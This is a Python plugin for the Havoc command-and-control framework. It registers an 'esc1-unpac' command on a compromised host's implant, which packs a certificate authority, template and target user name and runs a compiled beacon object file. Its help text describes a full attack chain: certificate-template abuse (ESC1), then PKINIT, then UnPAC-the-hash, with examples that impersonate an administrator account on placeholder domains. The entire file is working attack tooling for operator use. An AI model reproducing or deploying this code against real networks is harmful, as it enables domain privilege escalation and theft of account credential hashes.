from havoc import Demon, RegisterCommand
import os
import struct

# BOF directory - UPDATE THIS PATH to your installation
BOF_DIR = "/home/kali/ESC1-unPAC/havoc/bofs"

class Packer:
    def __init__(self):
        self.buffer = b""

    def addstr(self, s):
        if s is None:
            s = ""
        s = str(s)
        encoded = s.encode('utf-8') + b'\x00'
        self.buffer += struct.pack('<I', len(encoded)) + encoded

    def addint(self, i):
        self.buffer += struct.pack('<I', i)

    def getbuffer(self):
        return self.buffer

def esc1_unpac(demonID, *params):
    TaskID = None
    demon = Demon(demonID)

    args = [str(p) for p in params if p]

    if len(args) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]")
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "")
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Complete attack chain: ESC1 -> PKINIT -> UnPAC-the-hash")
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "")
        demon.ConsoleWrite(demon.CONSOLE_ERROR, r"Example: esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net")
        demon.ConsoleWrite(demon.CONSOLE_ERROR, r"With KDC: esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template admin@evilcorp.net dc01.evilcorp.net")
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Add 'nosid' to disable SID in certificate (not recommended)")
        return None

    ca, template, target_upn = args[0], args[1], args[2]
    kdc = args[3] if len(args) > 3 else ""
    nosid = args[4] if len(args) > 4 else ""
    bof_path = f"{BOF_DIR}/ESC1-unPAC.x64.o"

    if not os.path.exists(bof_path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"BOF not found: {bof_path}")
        return None

    packer = Packer()
    packer.addstr(ca)
    packer.addstr(template)
    packer.addstr(target_upn)
    packer.addstr(kdc)
    packer.addstr(nosid)

    sid_status = "(without SID)" if nosid.lower() in ['nosid', 'no', 'false', '0'] else "(with SID)"
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"ESC1-unPAC: CA={ca} Template={template} UPN={target_upn} {sid_status}")
    demon.InlineExecute(TaskID, "go", bof_path, packer.getbuffer(), False)

    return TaskID

RegisterCommand(esc1_unpac, "", "esc1-unpac", "ESC1 + PKINIT + UnPAC-the-hash (complete chain)", 0, "esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]", r"esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net")
